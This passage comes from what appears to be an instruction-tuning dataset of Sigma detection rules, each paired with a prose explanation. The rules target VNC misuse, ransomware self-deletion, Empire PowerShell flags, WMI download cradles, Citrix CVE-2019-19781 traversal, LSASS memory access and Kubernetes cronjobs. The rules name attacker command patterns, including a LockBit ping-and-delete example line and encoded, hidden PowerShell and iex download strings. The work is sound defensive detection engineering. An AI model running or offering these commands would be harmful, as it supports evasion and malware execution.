      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Description: VNCViewer\n        - Product: UltraVNC VNCViewer\n        - Company: UltraVNC\n        - OriginalFileName: VNCViewer.exe\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
      "question": "An adversary may use legitimate desktop support and remote access software,to establish an interactive command and control channel to target systems within networks",
      "answer": "In order to detect when an adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks, you should: Monitor Windows process creation logs for instances where the process description is \"VNCViewer\", the product is identified as \"UltraVNC VNCViewer\", the company associated with the process is \"UltraVNC\", and the original file name is \"VNCViewer.exe\". This detection is focused on identifying the use of VNCViewer, a component of UltraVNC, which is a legitimate remote desktop software that could be misused by attackers to control systems remotely. While this activity may represent legitimate use of UltraVNC for desktop support, instances detected under unusual circumstances or from unexpected sources should be investigated, considering the medium level of threat it represents, to distinguish between proper administrative use and potential malicious activity aiming at command and control."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting method often used by ransomware. Which combines the \"ping\" to wait a couple of seconds and then \"del\" to delete the file in question. Its used to hide the file responsible for the initial infection for example.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a method often used by ransomware, which combines the use of \"ping\" to wait a couple of seconds and then \"del\" to delete the file in question to hide the file responsible for the initial infection for example, you should: monitor process creation logs on Windows systems for command lines that contain specific patterns indicative of this attack method. These patterns include the presence of ' -n ' or ' /n ' which are used in ping commands to specify the number of echo requests to send, and the term 'Nul' indicating that the output of the command is being discarded. Additionally, look for command lines that contain ' /f ', ' -f ', ' /q ', or ' -q ' which are parameters for the 'del' command used to force delete files without prompting for confirmation and to delete files quietly without displaying output. For a command line to be considered suspect under this rule, it must contain all the following: the 'ping' command, which is used here to create a delay, the 'del' command signaling the deletion of files, and the aforementioned parameters and conditions that suggest an attempt to delete evidence of an initial infection stealthily. This detection strategy is tagged with ransomware, indicating its relevance in identifying attempts by such malware to operate undetected on infected systems.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Example: \"C:\\Windows\\System32\\cmd.exe\"  /C ping 127.0.0.7 -n 3 > Nul & fsutil file setZeroData offset=0 length=524288 \"C:\\Users\\User\\Desktop\\lockbit\\lockbit.exe\" & Del /f /q \"C:\\Users\\User\\Desktop\\lockbit\\lockbit.exe\".\n    selection_count:\n        CommandLine|contains:\n            - ' -n '\n            - ' /n '\n    selection_nul:\n        CommandLine|contains: 'Nul' # Covers \"> Nul\" and \">Nul \"\n    selection_del_param:\n        CommandLine|contains:\n            - ' /f '\n            - ' -f '\n            - ' /q '\n            - ' -q '\n    selection_all:\n        CommandLine|contains|all:\n            - 'ping' # Covers \"ping\" and \"ping.exe\"\n            - 'del '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Example: \"C:\\Windows\\System32\\cmd.exe\"  /C ping 127.0.0.7 -n 3 > Nul & fsutil file setZeroData offset=0 length=524288 \"C:\\Users\\User\\Desktop\\lockbit\\lockbit.exe\" & Del /f /q \"C:\\Users\\User\\Desktop\\lockbit\\lockbit.exe\".\n    selection_count:\n        CommandLine|contains:\n            - ' -n '\n            - ' /n '\n    selection_nul:\n        CommandLine|contains: 'Nul' # Covers \"> Nul\" and \">Nul \"\n    selection_del_param:\n        CommandLine|contains:\n            - ' /f '\n            - ' -f '\n            - ' /q '\n            - ' -q '\n    selection_all:\n        CommandLine|contains|all:\n            - 'ping' # Covers \"ping\" and \"ping.exe\"\n            - 'del '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "method often used by ransomware. Which combines the \"ping\" to wait a couple of seconds and then \"del\" to delete the file in question. Its used to hide the file responsible for the initial infection for example",
      "answer": "In order to detect a method often used by ransomware, which combines the use of \"ping\" to wait a couple of seconds and then \"del\" to delete the file in question to hide the file responsible for the initial infection for example, you should: monitor process creation logs on Windows systems for command lines that contain specific patterns indicative of this attack method. These patterns include the presence of ' -n ' or ' /n ' which are used in ping commands to specify the number of echo requests to send, and the term 'Nul' indicating that the output of the command is being discarded. Additionally, look for command lines that contain ' /f ', ' -f ', ' /q ', or ' -q ' which are parameters for the 'del' command used to force delete files without prompting for confirmation and to delete files quietly without displaying output. For a command line to be considered suspect under this rule, it must contain all the following: the 'ping' command, which is used here to create a delay, the 'del' command signaling the deletion of files, and the aforementioned parameters and conditions that suggest an attempt to delete evidence of an initial infection stealthily. This detection strategy is tagged with ransomware, indicating its relevance in identifying attempts by such malware to operate undetected on infected systems."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious powershell command line parameters used in Empire.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious PowerShell command line parameters used in Empire, you should monitor for process creation events on Windows systems for specific command line patterns. Look for executions of PowerShell commands that include parameters indicative of an attempt to evade detection and execute encoded commands. These parameters are often used by attackers to launch scripts without leaving easily traceable evidence. Specifically, watch out for PowerShell commands that contain any of the following strings: '-NoP -sta -NonI -W Hidden -Enc ', '-noP -sta -w 1 -enc ', '-NoP -NonI -W Hidden -enc ', '-noP -sta -w 1 -enc', '-enc  SQB', or '-nop -exec bypass -EncodedCommand '. These command line arguments are synonymous with stealth techniques, aiming to run processes in a hidden window, bypass execution policies, or execute encoded commands, which are common tactics in attacks leveraging the Empire framework. Be cautious, however, as there might be false positives where benign tools use similar command line parameters for legitimate purposes. Due to the high risk associated with these command patterns, this activity is classified with a high level of concern.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - ' -NoP -sta -NonI -W Hidden -Enc '\n            - ' -noP -sta -w 1 -enc '\n            - ' -NoP -NonI -W Hidden -enc '\n            - ' -noP -sta -w 1 -enc'\n            - ' -enc  SQB'\n            - ' -nop -exec bypass -EncodedCommand '\n    condition: selection\nfalsepositives:\n    - Other tools that incidentally use the same command line parameters\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - ' -NoP -sta -NonI -W Hidden -Enc '\n            - ' -noP -sta -w 1 -enc '\n            - ' -NoP -NonI -W Hidden -enc '\n            - ' -noP -sta -w 1 -enc'\n            - ' -enc  SQB'\n            - ' -nop -exec bypass -EncodedCommand '\n    condition: selection\nfalsepositives:\n    - Other tools that incidentally use the same command line parameters\nlevel: high\n",
      "question": "suspicious powershell command line parameters used in Empire",
      "answer": "In order to detect suspicious PowerShell command line parameters used in Empire, you should monitor for process creation events on Windows systems for specific command line patterns. Look for executions of PowerShell commands that include parameters indicative of an attempt to evade detection and execute encoded commands. These parameters are often used by attackers to launch scripts without leaving easily traceable evidence. Specifically, watch out for PowerShell commands that contain any of the following strings: '-NoP -sta -NonI -W Hidden -Enc ', '-noP -sta -w 1 -enc ', '-NoP -NonI -W Hidden -enc ', '-noP -sta -w 1 -enc', '-enc  SQB', or '-nop -exec bypass -EncodedCommand '. These command line arguments are synonymous with stealth techniques, aiming to run processes in a hidden window, bypass execution policies, or execute encoded commands, which are common tactics in attacks leveraging the Empire framework. Be cautious, however, as there might be false positives where benign tools use similar command line parameters for legitimate purposes. Due to the high risk associated with these command patterns, this activity is classified with a high level of concern."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious commands that are related to scripting/powershell in WMI Event Consumers.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious commands that are related to scripting/powershell in WMI Event Consumers, you should: focus on monitoring WMI event logs within Windows environments for specific command patterns that indicate potentially malicious activities. Look for instances where commands include the creation of new objects (`new-object`) specifically for web clients (`net.webclient`), followed by either downloading strings (`.downloadstring`) or files (`.downloadfile`). Additionally, be alert for the execution of PowerShell commands indicated by `iex(`, usage of `WScript.shell`, or PowerShell executed with parameters to bypass profile loading and execution policies (`-nop`, `-noprofile`). Also, watch for commands attempting to use encoding or decoding options (`-decode`, `-enc`) as well as the use of `System.Security.Cryptography.FromBase64Transform` which can be a sign of an attempt to execute obfuscated or encoded scripts. \n\nAttention should be paid to the `User` and `Operation` fields in the logs to identify the potentially malicious activities' origin and nature. However, be mindful of legitimate administrative scripts that might use similar patterns for valid reasons, as these can lead to false positives. The observation of these patterns is crucial due to their high correlation with tactics such as execution, persistence, privilege escalation, and defense evasion, which are common in several cyber attack scenarios.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: wmi_event\ndetection:\n    selection_destination:\n        - Destination|contains|all:\n            - 'new-object'\n            - 'net.webclient'\n            - '.downloadstring'\n        - Destination|contains|all:\n            - 'new-object'\n            - 'net.webclient'\n            - '.downloadfile'\n        - Destination|contains:\n            - ' iex('\n            - 'WScript.shell'\n            - ' -nop '\n            - ' -noprofile '\n            - ' -decode '\n            - ' -enc '\n        - Destination|contains:\n            - 'WScript.Shell'\n            - 'System.Security.Cryptography.FromBase64Transform'\n    condition: selection_destination\nfields:\n    - User\n    - Operation\nfalsepositives:\n    - Legitimate administrative scripts\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: wmi_event\ndetection:\n    selection_destination:\n        - Destination|contains|all:\n            - 'new-object'\n            - 'net.webclient'\n            - '.downloadstring'\n        - Destination|contains|all:\n            - 'new-object'\n            - 'net.webclient'\n            - '.downloadfile'\n        - Destination|contains:\n            - ' iex('\n            - 'WScript.shell'\n            - ' -nop '\n            - ' -noprofile '\n            - ' -decode '\n            - ' -enc '\n        - Destination|contains:\n            - 'WScript.Shell'\n            - 'System.Security.Cryptography.FromBase64Transform'\n    condition: selection_destination\nfields:\n    - User\n    - Operation\nfalsepositives:\n    - Legitimate administrative scripts\nlevel: high\n",
      "question": "suspicious commands that are related to scripting/powershell in WMI Event Consumers",
      "answer": "In order to detect suspicious commands that are related to scripting/powershell in WMI Event Consumers, you should: focus on monitoring WMI event logs within Windows environments for specific command patterns that indicate potentially malicious activities. Look for instances where commands include the creation of new objects (`new-object`) specifically for web clients (`net.webclient`), followed by either downloading strings (`.downloadstring`) or files (`.downloadfile`). Additionally, be alert for the execution of PowerShell commands indicated by `iex(`, usage of `WScript.shell`, or PowerShell executed with parameters to bypass profile loading and execution policies (`-nop`, `-noprofile`). Also, watch for commands attempting to use encoding or decoding options (`-decode`, `-enc`) as well as the use of `System.Security.Cryptography.FromBase64Transform` which can be a sign of an attempt to execute obfuscated or encoded scripts. \n\nAttention should be paid to the `User` and `Operation` fields in the logs to identify the potentially malicious activities' origin and nature. However, be mindful of legitimate administrative scripts that might use similar patterns for valid reasons, as these can lead to false positives. The observation of these patterns is crucial due to their high correlation with tactics such as execution, persistence, privilege escalation, and defense evasion, which are common in several cyber attack scenarios."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential exploitation attempt of undocumented Windows Server Pre Auth Remote Code Execution (RCE).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential exploitation attempt of undocumented Windows Server Pre Auth Remote Code Execution (RCE), you should: Monitor the creation of processes on Windows systems, focusing particularly on processes that are children of or identical to `svchost.exe`. This involves keeping an eye out for instances where the `svchost.exe` process is both starting another `svchost.exe` and where the command lines for these processes include the argument `-k DHCPServer`. Additionally, it's crucial to pay attention to the user context under which these processes are initiated, specifically looking for variations of the \"Network Service\" account in different language settings, including \"NETWORK SERVICE\", \"NETZWERKDIENST\", \"SERVIZIO DI RETE\", and \"SERVICIO DE RED\". This detailed surveillance is essential for identifying suspicious activity that could indicate an attacker is exploiting a vulnerability to execute remote code on a Windows Server without prior authentication.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\svchost.exe'\n        Image|endswith: '\\svchost.exe'\n        ParentCommandLine|contains: '-k DHCPServer'\n        CommandLine|contains: '-k DHCPServer'\n        User|contains: # Covers many language settings for Network Service. Please expand.\n            - 'NETWORK SERVICE'\n            - 'NETZWERKDIENST'\n            - 'SERVIZIO DI RETE'\n            - 'SERVICIO DE RED'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\svchost.exe'\n        Image|endswith: '\\svchost.exe'\n        ParentCommandLine|contains: '-k DHCPServer'\n        CommandLine|contains: '-k DHCPServer'\n        User|contains: # Covers many language settings for Network Service. Please expand.\n            - 'NETWORK SERVICE'\n            - 'NETZWERKDIENST'\n            - 'SERVIZIO DI RETE'\n            - 'SERVICIO DE RED'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "potential exploitation attempt of undocumented Windows Server Pre Auth Remote Code Execution (RCE)",
      "answer": "In order to detect potential exploitation attempt of undocumented Windows Server Pre Auth Remote Code Execution (RCE), you should: Monitor the creation of processes on Windows systems, focusing particularly on processes that are children of or identical to `svchost.exe`. This involves keeping an eye out for instances where the `svchost.exe` process is both starting another `svchost.exe` and where the command lines for these processes include the argument `-k DHCPServer`. Additionally, it's crucial to pay attention to the user context under which these processes are initiated, specifically looking for variations of the \"Network Service\" account in different language settings, including \"NETWORK SERVICE\", \"NETZWERKDIENST\", \"SERVIZIO DI RETE\", and \"SERVICIO DE RED\". This detailed surveillance is essential for identifying suspicious activity that could indicate an attacker is exploiting a vulnerability to execute remote code on a Windows Server without prior authentication."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting CVE-2019-19781 exploitation attempt against Citrix Netscaler, Application Delivery Controller and Citrix Gateway Attack.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect CVE-2019-19781 exploitation attempt against Citrix Netscaler, Application Delivery Controller, and Citrix Gateway Attack, you should monitor your webserver logs, particularly focusing on requests to the Citrix Netscaler appliance. Watch for specific patterns in the URI queries that attackers might use to exploit vulnerabilities. These patterns include attempts to access the '../vpns/' directory, which might indicate an attempt at directory traversal. Additionally, be alert for queries that end with '/vpns/cfg/smb.conf', as this could suggest an attempt to gain access to sensitive configuration files.\n\nFurthermore, you should pay close attention to the access of scripts within the '/vpns/portal/scripts/' directory, especially those with a '.pl' extension. Almost all scripts in this path, except 'logout.pl', are considered exploitable and should be closely monitored for unauthorized access attempts.\n\nLogs should capture key fields including the client's IP address, the virtual host (vhost), the requested URL, and the server's response to the request. Monitoring these fields can help in identifying and investigating suspicious activities effectively.\n\nBe aware that there might be unknown patterns of false positives; however, given the critical severity level indicated for this type of attack, utmost attention and prompt investigation of detected patterns are recommended to prevent or mitigate potential exploitation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: webserver\n    definition: 'Make sure that your Netscaler appliance logs all kinds of attacks (test with http://your-citrix-gw.net/robots.txt). The directory traversal with ../ might not be needed on certain cloud instances or for authenticated users, so we also check for direct paths. All scripts in portal/scripts are exploitable except logout.pl.'\ndetection:\n    selection_cs:\n        - cs-uri-query|contains: '/../vpns/'\n        - cs-uri-query|endswith: '/vpns/cfg/smb.conf'\n    selection_csall:\n        cs-uri-query|contains|all:\n            - '/vpns/portal/scripts/'\n            - '.pl'\n    condition: 1 of selection_*\nfields:\n    - client_ip\n    - vhost\n    - url\n    - response\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: webserver\n    definition: 'Make sure that your Netscaler appliance logs all kinds of attacks (test with http://your-citrix-gw.net/robots.txt). The directory traversal with ../ might not be needed on certain cloud instances or for authenticated users, so we also check for direct paths. All scripts in portal/scripts are exploitable except logout.pl.'\ndetection:\n    selection_cs:\n        - cs-uri-query|contains: '/../vpns/'\n        - cs-uri-query|endswith: '/vpns/cfg/smb.conf'\n    selection_csall:\n        cs-uri-query|contains|all:\n            - '/vpns/portal/scripts/'\n            - '.pl'\n    condition: 1 of selection_*\nfields:\n    - client_ip\n    - vhost\n    - url\n    - response\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "CVE-2019-19781 exploitation attempt against Citrix Netscaler, Application Delivery Controller and Citrix Gateway Attack",
      "answer": "In order to detect CVE-2019-19781 exploitation attempt against Citrix Netscaler, Application Delivery Controller, and Citrix Gateway Attack, you should monitor your webserver logs, particularly focusing on requests to the Citrix Netscaler appliance. Watch for specific patterns in the URI queries that attackers might use to exploit vulnerabilities. These patterns include attempts to access the '../vpns/' directory, which might indicate an attempt at directory traversal. Additionally, be alert for queries that end with '/vpns/cfg/smb.conf', as this could suggest an attempt to gain access to sensitive configuration files.\n\nFurthermore, you should pay close attention to the access of scripts within the '/vpns/portal/scripts/' directory, especially those with a '.pl' extension. Almost all scripts in this path, except 'logout.pl', are considered exploitable and should be closely monitored for unauthorized access attempts.\n\nLogs should capture key fields including the client's IP address, the virtual host (vhost), the requested URL, and the server's response to the request. Monitoring these fields can help in identifying and investigating suspicious activities effectively.\n\nBe aware that there might be unknown patterns of false positives; however, given the critical severity level indicated for this type of attack, utmost attention and prompt investigation of detected patterns are recommended to prevent or mitigate potential exploitation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting process access to LSASS memory with suspicious access flags.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect process access to LSASS memory with suspicious access flags, you should monitor Windows processes based on process access attempts that may be indicative of an attack. Specifically, focus on processes attempting to access 'lsass.exe', a critical Windows process associated with local security and authentication. Pay attention to attempts with granted access levels ending in '30', '50', '70', '90', 'B0', 'D0', 'F0', '18', '38', '58', '78', '98', 'B8', 'D8', 'F8', '1A', '3A', '5A', '7A', '9A', 'BA', 'DA', 'FA', and specifically '0x14C2'. These levels of access could indicate malicious intent such as credential dumping.\n\nHowever, it's crucial to exclude legitimate software from triggering false alarms by considering the source of the process access request. Exclude known paths related to common legitimate applications such as Task Manager, Malwarebytes, certain built-in Windows utilities, Cisco AnyConnect, Microsoft's Windows Defender, VMware Tools, and others specified in the rule. Additionally, consider excluding Antivirus or EDR agents specific paths, which might otherwise generate false positives.\n\nFocus especially on detecting malicious activities that haven't been excluded by the filters, as this maintains a balance between security monitoring and operational functionality, minimizing the disruption caused by false positive alerts. This approach covers a substantial portion of the methods attackers might use to access sensitive LSASS memory content, aiming to exploit it for credentials theft while reducing the noise from legitimate security and system management tools.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        TargetImage|endswith: '\\lsass.exe'\n        GrantedAccess|endswith:\n            # - '10'  # covered in rule 678dfc63-fefb-47a5-a04c-26bcf8cc9f65\n            - '30'\n            - '50'\n            - '70'\n            - '90'\n            - 'B0'\n            - 'D0'\n            - 'F0'\n            - '18'\n            - '38'\n            - '58'\n            - '78'\n            - '98'\n            - 'B8'\n            - 'D8'\n            - 'F8'\n            - '1A'\n            - '3A'\n            - '5A'\n            - '7A'\n            - '9A'\n            - 'BA'\n            - 'DA'\n            - 'FA'\n            - '0x14C2'  # https://github.com/b4rtik/ATPMiniDump/blob/76304f93b390af3bb66e4f451ca16562a479bdc9/ATPMiniDump/ATPMiniDump.c\n    # Absolute paths to programs that cause false positives\n    filter_absolute:\n        SourceImage:\n            - 'C:\\WINDOWS\\system32\\taskmgr.exe'\n            - 'C:\\Program Files\\Malwarebytes\\Anti-Malware\\MBAMService.exe'\n            - 'C:\\PROGRAMDATA\\MALWAREBYTES\\MBAMSERVICE\\ctlrupdate\\mbupdatr.exe'\n            - 'C:\\WINDOWS\\system32\\taskhostw.exe'\n            - 'C:\\Program Files\\Windows Defender\\MsMpEng.exe'\n            - 'C:\\Windows\\SysWOW64\\msiexec.exe'\n            - 'C:\\Windows\\System32\\msiexec.exe'\n            - 'C:\\Windows\\System32\\lsass.exe'\n            - 'C:\\WINDOWS\\System32\\perfmon.exe'\n            - 'C:\\Windows\\System32\\MRT.exe'\n            - 'C:\\Program Files\\Cisco\\Cisco AnyConnect Secure Mobility Client\\vpnagent.exe'\n            - 'C:\\Program Files (x86)\\Cisco\\Cisco AnyConnect Secure Mobility Client\\vpnagent.exe'\n    # VSCode\n    filter_vscode:\n        SourceImage|startswith: 'C:\\Users\\'\n        SourceImage|endswith: '\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe'\n    # Windows Defender\n    filter_windefend_1:\n        SourceImage|startswith: 'C:\\ProgramData\\Microsoft\\Windows Defender\\'\n        SourceImage|endswith: '\\MsMpEng.exe'\n    filter_windefend_2:\n        CallTrace|contains|all:\n            - '|C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\{'\n            - '}\\mpengine.dll+'\n        GrantedAccess: '0x1418'\n    filter_windefend_3:\n        # Trigger Win7\n        SourceImage: 'C:\\Program Files\\Microsoft Security Client\\MsMpEng.exe'\n        GrantedAccess: '0x1418'\n    # VMware Tools\n    filter_vmwaretools:\n        SourceImage|startswith: 'C:\\ProgramData\\VMware\\VMware Tools\\'\n        SourceImage|endswith: '\\vmtoolsd.exe'\n    # Antivirus and EDR agents\n    filter_generic_av:\n        # When using this rule. Remove this filter and replace it by the path of the specific AV you use\n        SourceImage|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n        SourceImage|contains: 'Antivirus'\n    filter_mrt:\n        SourceImage: 'C:\\WINDOWS\\system32\\MRT.exe'\n        GrantedAccess: '0x1418'\n    filter_mcafee:\n        SourceImage: 'C:\\Program Files\\Common Files\\McAfee\\MMSSHost\\MMSSHOST.exe'\n    filter_nextron:\n        # Remove this if you don't use Nextron Products\n        SourceImage|startswith: 'C:\\Windows\\Temp\\asgard2-agent\\'\n        SourceImage|endswith:\n            - '\\thor64.exe'\n            - '\\thor.exe'\n        GrantedAccess: '0x1fffff'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Legitimate software such as AV and EDR\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        TargetImage|endswith: '\\lsass.exe'\n        GrantedAccess|endswith:\n            # - '10'  # covered in rule 678dfc63-fefb-47a5-a04c-26bcf8cc9f65\n            - '30'\n            - '50'\n            - '70'\n            - '90'\n            - 'B0'\n            - 'D0'\n            - 'F0'\n            - '18'\n            - '38'\n            - '58'\n            - '78'\n            - '98'\n            - 'B8'\n            - 'D8'\n            - 'F8'\n            - '1A'\n            - '3A'\n            - '5A'\n            - '7A'\n            - '9A'\n            - 'BA'\n            - 'DA'\n            - 'FA'\n            - '0x14C2'  # https://github.com/b4rtik/ATPMiniDump/blob/76304f93b390af3bb66e4f451ca16562a479bdc9/ATPMiniDump/ATPMiniDump.c\n    # Absolute paths to programs that cause false positives\n    filter_absolute:\n        SourceImage:\n            - 'C:\\WINDOWS\\system32\\taskmgr.exe'\n            - 'C:\\Program Files\\Malwarebytes\\Anti-Malware\\MBAMService.exe'\n            - 'C:\\PROGRAMDATA\\MALWAREBYTES\\MBAMSERVICE\\ctlrupdate\\mbupdatr.exe'\n            - 'C:\\WINDOWS\\system32\\taskhostw.exe'\n            - 'C:\\Program Files\\Windows Defender\\MsMpEng.exe'\n            - 'C:\\Windows\\SysWOW64\\msiexec.exe'\n            - 'C:\\Windows\\System32\\msiexec.exe'\n            - 'C:\\Windows\\System32\\lsass.exe'\n            - 'C:\\WINDOWS\\System32\\perfmon.exe'\n            - 'C:\\Windows\\System32\\MRT.exe'\n            - 'C:\\Program Files\\Cisco\\Cisco AnyConnect Secure Mobility Client\\vpnagent.exe'\n            - 'C:\\Program Files (x86)\\Cisco\\Cisco AnyConnect Secure Mobility Client\\vpnagent.exe'\n    # VSCode\n    filter_vscode:\n        SourceImage|startswith: 'C:\\Users\\'\n        SourceImage|endswith: '\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe'\n    # Windows Defender\n    filter_windefend_1:\n        SourceImage|startswith: 'C:\\ProgramData\\Microsoft\\Windows Defender\\'\n        SourceImage|endswith: '\\MsMpEng.exe'\n    filter_windefend_2:\n        CallTrace|contains|all:\n            - '|C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\{'\n            - '}\\mpengine.dll+'\n        GrantedAccess: '0x1418'\n    filter_windefend_3:\n        # Trigger Win7\n        SourceImage: 'C:\\Program Files\\Microsoft Security Client\\MsMpEng.exe'\n        GrantedAccess: '0x1418'\n    # VMware Tools\n    filter_vmwaretools:\n        SourceImage|startswith: 'C:\\ProgramData\\VMware\\VMware Tools\\'\n        SourceImage|endswith: '\\vmtoolsd.exe'\n    # Antivirus and EDR agents\n    filter_generic_av:\n        # When using this rule. Remove this filter and replace it by the path of the specific AV you use\n        SourceImage|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n        SourceImage|contains: 'Antivirus'\n    filter_mrt:\n        SourceImage: 'C:\\WINDOWS\\system32\\MRT.exe'\n        GrantedAccess: '0x1418'\n    filter_mcafee:\n        SourceImage: 'C:\\Program Files\\Common Files\\McAfee\\MMSSHost\\MMSSHOST.exe'\n    filter_nextron:\n        # Remove this if you don't use Nextron Products\n        SourceImage|startswith: 'C:\\Windows\\Temp\\asgard2-agent\\'\n        SourceImage|endswith:\n            - '\\thor64.exe'\n            - '\\thor.exe'\n        GrantedAccess: '0x1fffff'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Legitimate software such as AV and EDR\nlevel: high\n",
      "question": "process access to LSASS memory with suspicious access flags",
      "answer": "In order to detect process access to LSASS memory with suspicious access flags, you should monitor Windows processes based on process access attempts that may be indicative of an attack. Specifically, focus on processes attempting to access 'lsass.exe', a critical Windows process associated with local security and authentication. Pay attention to attempts with granted access levels ending in '30', '50', '70', '90', 'B0', 'D0', 'F0', '18', '38', '58', '78', '98', 'B8', 'D8', 'F8', '1A', '3A', '5A', '7A', '9A', 'BA', 'DA', 'FA', and specifically '0x14C2'. These levels of access could indicate malicious intent such as credential dumping.\n\nHowever, it's crucial to exclude legitimate software from triggering false alarms by considering the source of the process access request. Exclude known paths related to common legitimate applications such as Task Manager, Malwarebytes, certain built-in Windows utilities, Cisco AnyConnect, Microsoft's Windows Defender, VMware Tools, and others specified in the rule. Additionally, consider excluding Antivirus or EDR agents specific paths, which might otherwise generate false positives.\n\nFocus especially on detecting malicious activities that haven't been excluded by the filters, as this maintains a balance between security monitoring and operational functionality, minimizing the disruption caused by false positive alerts. This approach covers a substantial portion of the methods attackers might use to access sensitive LSASS memory content, aiming to exploit it for credentials theft while reducing the noise from legitimate security and system management tools."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Azure Kubernetes CronJob runs in Azure Cloud. Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate.\nKubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs.\nAn Adversary may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to identify when a Azure Kubernetes CronJob runs in Azure Cloud. Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. An Adversary may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster, you should: Monitor Azure activity logs for specific operation names that indicate interaction with Kubernetes connected clusters and managed clusters, particularly those operation names that start with 'MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/BATCH' or 'MICROSOFT.CONTAINERSERVICE/MANAGEDCLUSTERS/BATCH' and end with '/CRONJOBS/WRITE' or '/JOBS/WRITE'. These logs are indicative of activities related to the creation or modification of Kubernetes Jobs and CronJobs, which can be used for legitimate batch processing tasks but might also be utilized by adversaries for malicious purposes. It is essential to consider that some detected activities may be legitimate administrative actions. Hence, known benign behaviors may need to be filtered out to reduce false positives. This approach leverages Azure's logging capabilities to identify potential misuse of Kubernetes CronJobs and Jobs, ensuring that only those activities that deviate from expected patterns are flagged for further investigation. The associated tactics and techniques for this kind of monitoring include Execution and Persistence, as managing and scheduling tasks like CronJobs and Jobs can be abused by attackers to execute malicious code or maintain their presence within a cluster.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: activitylogs\ndetection:\n    selection:\n        operationName|startswith: \n            - 'MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/BATCH'\n            - 'MICROSOFT.CONTAINERSERVICE/MANAGEDCLUSTERS/BATCH'\n        operationName|endswith:\n            - '/CRONJOBS/WRITE'\n            - '/JOBS/WRITE'\n    condition: selection\nfalsepositives:\n    - Azure Kubernetes CronJob/Job may be done by a system administrator.\n    - If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
